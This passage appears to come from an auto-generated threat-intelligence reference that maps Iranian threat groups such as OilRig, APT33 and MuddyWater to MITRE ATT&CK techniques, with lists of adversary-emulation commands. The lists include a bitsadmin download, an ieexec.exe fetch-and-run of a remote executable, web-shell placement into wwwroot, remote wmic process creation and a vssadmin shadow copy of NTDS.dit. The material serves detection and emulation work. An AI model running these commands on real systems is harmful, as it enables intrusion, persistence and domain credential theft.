telnet google.com 8081
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Uncommonly Used Port

## Technique Description

```
Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.
```

## Technique Commands

```
test-netconnection -ComputerName google.com -port #{port}
test-netconnection -ComputerName google.com -port 8081
telnet google.com #{port}
telnet google.com 8081
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Uncommonly Used Port

## Technique Description

```
Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.
```

## Technique Commands

```
test-netconnection -ComputerName google.com -port #{port}
test-netconnection -ComputerName google.com -port 8081
telnet google.com #{port}
telnet google.com 8081
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: User Execution

## Technique Description

```
An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. 

As an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) 

While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.
```

## Technique Commands

```
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: User Execution

## Technique Description

```
An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. 

As an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) 

While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.
```

## Technique Commands

```
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: User Execution

## Technique Description

```
An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. 

As an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) 

While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.
```

## Technique Commands

```
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: User Execution

## Technique Description

```
An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. 

As an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) 

While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.
```

## Technique Commands

```
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: User Execution

## Technique Description

```
An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. 

As an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) 

While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.
```

## Technique Commands

```
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Valid Accounts

## Technique Description

```
Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. 

Accounts that an adversary may use can fall into three categories: default, local, and domain accounts. Default accounts are those that are built-into an OS such as Guest or Administrator account on Windows systems or default factory/provider set accounts on other types of systems, software, or devices. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.

Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

Default accounts are also not limited to Guest and Administrator on client machines, they also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or COTS. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed private keys, or stolen private keys, to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021) (Citation: Metasploit SSH Module)

The overlap of account access, credentials, and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)
```

## Technique Commands

```
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Valid Accounts

## Technique Description

```
Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. 

Accounts that an adversary may use can fall into three categories: default, local, and domain accounts. Default accounts are those that are built-into an OS such as Guest or Administrator account on Windows systems or default factory/provider set accounts on other types of systems, software, or devices. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.

Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

Default accounts are also not limited to Guest and Administrator on client machines, they also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or COTS. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed private keys, or stolen private keys, to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021) (Citation: Metasploit SSH Module)

The overlap of account access, credentials, and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)
```

## Technique Commands

```
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Valid Accounts

## Technique Description

```
Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. 

Accounts that an adversary may use can fall into three categories: default, local, and domain accounts. Default accounts are those that are built-into an OS such as Guest or Administrator account on Windows systems or default factory/provider set accounts on other types of systems, software, or devices. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.

Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

Default accounts are also not limited to Guest and Administrator on client machines, they also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or COTS. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed private keys, or stolen private keys, to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021) (Citation: Metasploit SSH Module)

The overlap of account access, credentials, and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)
```

## Technique Commands

```
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Web Service

## Technique Description

```
Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.

These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
```

## Technique Commands

```
bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html
Invoke-WebRequest -Uri www.twitter.com
$T1102 = (New-Object System.Net.WebClient).DownloadData("https://www.reddit.com/")
$wc = New-Object System.Net.WebClient
$T1102 = $wc.DownloadString("https://www.aol.com/")
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Web Shell

## Technique Description

```
A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)

Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.
```

## Technique Commands

```
xcopy #{web_shells} C:\inetpub\wwwroot
xcopy PathToAtomicsFolder\T1100\shells\ C:\inetpub\wwwroot
ieexec.exe http://*:8080/bypass.exe
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Web Shell

## Technique Description

```
A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)

Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.
```

## Technique Commands

```
xcopy #{web_shells} C:\inetpub\wwwroot
xcopy PathToAtomicsFolder\T1100\shells\ C:\inetpub\wwwroot
ieexec.exe http://*:8080/bypass.exe
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Windows Management Instrumentation

## Technique Description

```
Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)

An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)
```

## Technique Commands

```
wmic useraccount get /ALL
wmic process get caption,executablepath,commandline
wmic qfe get description,installedOn /format:csv
wmic /node:"192.168.0.1" service where (caption like "%#{service_search_string} (%")
wmic /node:"192.168.0.1" service where (caption like "%sql server (%")
wmic process call create calc.exe
wmic /node:"192.168.0.1" process call create #{process_to_execute}
wmic /node:"192.168.0.1" process call create calc.exe
wmic.exe /NODE:*process call create*
wmic.exe /NODE:*path AntiVirusProduct get*
wmic.exe /NODE:*path FirewallProduct get*
WmiPrvSE.exe
wmic.exe /NODE: "192.168.0.1" process call create "*.exe"
wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM <path> ^> <path>"
wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
powershell/lateral_movement/invoke_wmi
powershell/lateral_movement/invoke_wmi
powershell/persistence/elevated/wmi
powershell/persistence/elevated/wmi
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Windows Management Instrumentation

## Technique Description

```
Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)

An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)
```

## Technique Commands

```
wmic useraccount get /ALL
wmic process get caption,executablepath,commandline
wmic qfe get description,installedOn /format:csv
wmic /node:"192.168.0.1" service where (caption like "%#{service_search_string} (%")
wmic /node:"192.168.0.1" service where (caption like "%sql server (%")
wmic process call create calc.exe
wmic /node:"192.168.0.1" process call create #{process_to_execute}
wmic /node:"192.168.0.1" process call create calc.exe
wmic.exe /NODE:*process call create*
wmic.exe /NODE:*path AntiVirusProduct get*
wmic.exe /NODE:*path FirewallProduct get*
WmiPrvSE.exe
wmic.exe /NODE: "192.168.0.1" process call create "*.exe"
wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM <path> ^> <path>"
wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
powershell/lateral_movement/invoke_wmi
powershell/lateral_movement/invoke_wmi
powershell/persistence/elevated/wmi
powershell/persistence/elevated/wmi
```